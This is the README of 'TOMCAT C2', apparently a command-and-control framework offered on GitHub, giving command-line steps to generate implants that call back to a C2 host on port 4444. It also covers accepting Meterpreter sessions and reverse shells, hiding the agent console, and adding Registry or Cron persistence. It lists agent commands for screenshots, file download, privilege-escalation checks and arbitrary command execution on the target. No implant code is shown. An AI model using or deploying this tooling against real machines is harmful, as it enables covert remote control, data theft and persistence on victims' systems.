# TOMCAT C2 Frameworks

```
        ___________________      _____  _________     ________________ _________  ________
        \__    ___/\_____  \    /     \ \_   ___ \   /  _  \__    ___/ \_   ___ \ \_____  \
          |    |    /   |   \  /  \ /  \/    \  \/  /  /_\  \|    |    /    \  \/  /  ____/
          |    |   /    |    \/    Y    \     \____/    |    \    |    \     \____/       \
          |____|   \_______  /\____|__  /\______  /\____|__  /____|     \______  /\_______ \
                           \/         \/        \/         \/                  \/         \/
                                        TOMCAT C2 Frameworks
```

**Author:** TOM7  
**GitHub:** [tom7voldemort](https://github.com/tom7voldemort)

> Copying without owner permission is illegal. If you want to expand this project, ask the owner for collaboration instead.

---

## Overview

TOMCAT C2 is a multi-protocol Command & Control framework supporting three types of incoming connections on a single port: native TOMCAT agents, Meterpreter sessions, and generic reverse shells. It supports Mutual TLS (mTLS) for authenticated, encrypted agent communication and ships with a built-in PKI to manage certificates.

---

## Features

- **Multi-Protocol** — single listener accepts TOMCAT agents, Meterpreter, and reverse shells simultaneously
- **mTLS Support** — mutual TLS with CA-signed client certificates; only authorized agents can connect
- **Fernet Encryption** — all TOMCAT agent traffic is encrypted end-to-end using symmetric Fernet keys
- **Three Interfaces** — CLI, Web Panel (Flask), and Tkinter GUI
- **Built-in PKI** — generate CA, server certificates, and per-agent certificates from the CLI
- **Agent Packaging** — auto-generates a ready-to-deploy agent folder with pre-configured certs and script
- **Certificate Management** — list, generate, and revoke agent certificates
- **File Transfer** — upload and download files to/from agents
- **Session Commands** — `sysinfo`, `screenshot`, `elevate`, `cd`, `download`, `upload`, `stoptask`
- **Persistence** — optional Windows (Registry) and Linux (Cron) persistence for agents
- **Multi-Session** — interact with multiple sessions concurrently

---

## Requirements

```
Python 3.8+
cryptography
flask         (for Web Panel mode)
pysocks
```

Install dependencies:

```bash
pip install -r requirements.txt
```

---

## Project Structure

```
.
├── start.py                        # Entry point
├── AGENT/
│   └── tomcatv2a.py                # Agent template
├── IMPLANT/                        # Generated agent packages (auto-created)
├── Certs/                          # Server certificates (auto-created)
│   ├── ca-key.pem
│   ├── ca-cert.pem
│   ├── server-key.pem
│   ├── server-cert.pem
│   └── Agent````                   # Per-agent certificates
├── Downloads/                      # Files received from agents (auto-created)
├── Cores/
│   ├── App/
│   │   ├── App.py                  # Web Panel (Flask)
│   │   ├── Cli.py                  # CLI Interface
│   │   └── Gui.py                  # Tkinter GUI
│   └── Systems/
│       ├── Server.py               # Standard TOMCAT-only server
│       ├── MultiProtocolServer.py  # Multi-protocol server
│       ├── CertificateManager.py   # PKI / certificate management
│       └── Cryptography.py         # Fernet encryption wrapper
└── Config/
    ├── Color.py
    ├── Logo.py
    ├── Helper.py
    └── templates/
    │   └── index.html
    │
    └── static/
        ├── css/
        │   └── style.css
        └── js/
            └── script.js
        
```

---

## Quick Start

### 1. Initialize Certificates (required for mTLS)

```bash
python3 start.py --init-certs
```

Optionally specify the server's public IP so the cert SAN matches:

```bash
python3 start.py --init-certs --server-host 192.168.1.10
```

### 2. Generate an Agent Package

```bash
python3 start.py --gen-agent myagent --agent-host 192.168.1.10 --agent-port 4444 --agent-mtls
```

This creates `IMPLANT/MYAGENT/` containing:

```
IMPLANT/MYAGENT/
├── tomcatv2a.py      # Pre-configured agent script
├── agent-key.pem
├── agent-cert.pem
├── ca-cert.pem
└── README.txt
```

Copy the entire folder to the target machine and run:

```bash
python3 tomcatv2a.py
```

### 3. Start the Server

**CLI mode (standard TOMCAT only):**
```bash
python3 start.py -C
```

**CLI mode with mTLS:**
```bash
python3 start.py -C -T
```

**CLI mode with Meterpreter + mTLS (all protocols):**
```bash
python3 start.py -C -M -T
```

**Web Panel (default):**
```bash
python3 start.py
```

---

## Command Reference

### `start.py` Flags

| Flag | Long Form | Description |
|------|-----------|-------------|
| `-i` | `--init-certs` | Initialize CA and server certificates |
| `-a ID` | `--gen-agent ID` | Generate agent certificate and package |
| `-m` | `--gen-multi-agent` | Generate multiple agents |
| `-c N` | `--gen-agent-count N` | Number of agents to generate (default: 10) |
| `-u PREFIX` | `--gen-agent-prefix PREFIX` | Agent name prefix (default: agent) |
| `-l` | `--list-agents` | List all issued agent certificates |
| `-r ID` | `--revoke-agent ID` | Revoke an agent certificate |
| `-T` | `--mtls` | Enable mTLS on the server |
| `-M` | `--meterpreter` | Enable multi-protocol mode (Meterpreter + RevShell) |
| `-w HOST` | `--host HOST` | Web panel bind host (default: 0.0.0.0) |
| `-p PORT` | `--port PORT` | Web panel port (default: 5000) |
| `-S HOST` | `--server-host HOST` | Host embedded in server certificate SAN |
| `-ah HOST` | `--agent-host HOST` | C2 host embedded in generated agent script |
| `-ap PORT` | `--agent-port PORT` | C2 port embedded in generated agent script |
| `-am` | `--agent-mtls` | Enable mTLS in generated agent |
| `-hc` | `--hide-console` | Hide console window in generated agent (Windows) |
| `-ps` | `--persistence` | Add persistence to generated agent |
| `-C` | `--cli-mode` | Start with CLI interface |
| `-G` | `--gui-mode` | Start with Tkinter GUI |
| `-W` | `--web-mode` | Start with Web Panel (Flask) |

### CLI Session Commands

| Command | Description |
|---------|-------------|
| `sessions` | List all active sessions |
| `use <id>` | Enter interactive shell for a session |
| `exec <id> <cmd>` | Execute a single command on a session |
| `kill <id>` | Terminate a session |
| `status` | Show server status and uptime |
| `stats` | Session type breakdown (TOMCAT / Meterpreter / Shell) |
| `logs` | View recent event log |
| `clear` | Clear terminal |
| `help` | Show command reference |
| `exit` | Stop server and quit |

### Agent Commands (inside `use <id>`)

| Command | Description |
|---------|-------------|
| `sysinfo` | Full system information |
| `elevate` | Check privilege escalation opportunities |
| `screenshot` | Capture and download a screenshot |
| `download <path>` | Download a file from the agent |
| `upload <local> <remote>` | Upload a file to the agent |
| `dl <path>` | Alias for download |
| `cd <dir>` | Change working directory on agent |
| `stoptask` | Kill the currently running command |
| `back` | Return to main console |
| Any shell command | Executed via `subprocess` on the target |

---

## mTLS Architecture

```
  C2 Server                          Agent
  ─────────                          ─────
  ca-cert.pem  ◄── shared trust ──►  ca-cert.pem
  server-key.pem                     agent-key.pem
  server-cert.pem                    agent-cert.pem
       │                                  │
       └──────── TLS mutual auth ─────────┘
```

The CA signs both the server certificate and every agent certificate. During the TLS handshake both sides verify each other against the same CA. An agent without a valid CA-signed certificate is rejected at the SSL layer before any C2 protocol is spoken.

---

## Multi-Protocol Mode (`-M`)

When started with `-M`, the server detects the session type from the first bytes of each incoming connection:

| First bytes | Detected as |
|-------------|-------------|
| TLS ClientHello (`0x16 0x03`) | TOMCAT agent (SSL wrapped, then identified) |
| Meterpreter length-prefix header | Meterpreter session |
| Printable UTF-8 / shell prompt | Reverse shell |

This allows a single port to accept all three simultaneously without reconfiguration.

---

## Certificate Management

```bash
# Initialize CA + server cert
python3 start.py --init-certs

# Generate single agent package (mTLS enabled)
python3 start.py -a agent01 -ah 10.0.0.1 -ap 4444 -am

# Generate 5 agents with a prefix
python3 start.py -m -c 5 -u op1 -ah 10.0.0.1 -ap 4444 -am

# List all issued agent certs
python3 start.py -l

# Revoke an agent cert
python3 start.py -r agent01
```

Certificates are stored in `Certs/`. Agent certificates are stored in `Certs/AgentTCF/`. Metadata (creation dates, paths) is tracked in `Certs/Metadata.json`.

| Certificate | Validity |
|-------------|----------|
| CA | 10 years |
| Server | 1 year |
| Agent | 1 year (default) |

---

## Agent Configuration

The generated `tomcatv2a.py` has these variables pre-filled by `start.py`:

```python
ServerHost     = "192.168.1.10"
ServerPort     = 4444
UseMTLS        = True
HideConsole    = False
AddPersistence = False
```

To deploy without mTLS (plain TCP), omit `-am` when generating the agent:

```bash
python3 start.py -a myagent -ah 192.168.1.10 -ap 4444
```

---

## Known Issues / Fixes Applied

**Bug (fixed in `MultiProtocolServer.py`):** When running with both `-M` (MeterpreterMode) and `-T` (mTLS), TOMCAT agents using `UseMTLS=True` could not connect. The root cause was:

1. `StartServer()` and `SessionHandler()` guarded SSL setup with `and not self.MeterpreterMode`, so no SSL wrapping ever happened.
2. `IdentifySession()` detected the TLS ClientHello from the agent and immediately closed the connection.

The fix applies SSL wrapping based on a **peek** of the first bytes — plain-TCP clients (Meterpreter, reverse shells) pass through unwrapped, while TLS clients (TOMCAT agents) are wrapped before identification.

---

## Security Notes

- Keep `ca-key.pem` and `server-key.pem` secure and never deploy them to agents.
- Each agent receives its own unique key pair; revoking one does not affect others.
- Without `-T`/`--mtls`, any client that completes the TOMCAT handshake will be accepted — use mTLS in production.
- Fernet keys are ephemeral (generated at server start); restarting the server invalidates all existing agent sessions.
